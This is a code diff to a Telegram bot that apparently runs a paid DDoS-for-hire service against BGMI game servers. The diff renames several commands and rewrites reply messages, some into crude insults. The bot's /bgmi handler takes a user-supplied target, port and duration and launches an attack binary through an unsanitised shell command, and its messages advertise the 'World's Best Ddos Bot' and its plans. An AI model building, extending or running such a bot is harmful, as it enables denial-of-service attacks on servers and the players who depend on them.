@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @venomxcrazy"
+    response = f"{username}, Le Re LanD ke Hogya tera attack.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -217,7 +217,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['bgmi2'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -244,9 +244,9 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"Le re Land ke hogya attck conplete. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy @venomXcrazy"  # Updated command syntax
+            response = "ip port daal le Chutye"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command.\nBy @venomXcrazy"
 
@@ -275,7 +275,7 @@ def show_command_logs(message):
     bot.reply_to(message, response)
 
 
-@bot.message_handler(commands=['help'])
+@bot.message_handler(commands=['heelp'])
 def show_help(message):
     help_text = '''Available commands:
  /bgmi : Method For Bgmi Servers. 
@@ -297,7 +297,7 @@ def show_help(message):
                 help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=['staart'])
 def welcome_start(message):
     user_name = message.from_user.first_name
     response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @venomXcrazy"
@@ -315,7 +315,7 @@ def welcome_rules(message):
 By @venomXcrazy'''
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['plan'])
+@bot.message_handler(commands=['plaan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
@@ -333,7 +333,7 @@ By  @venomXcrazy
 '''
     bot.reply_to(message, response)
 
-@bot.message_handler(commands=['admincmd'])
+@bot.message_handler(commands=['aadmincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Admin Commands Are Here!!:
@@ -349,7 +349,7 @@ By  @venomXcrazy
     bot.reply_to(message, response)
 
 
-@bot.message_handler(commands=['broadcast'])
+@bot.message_handler(commands=['broaadcast'])
 def broadcast_message(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
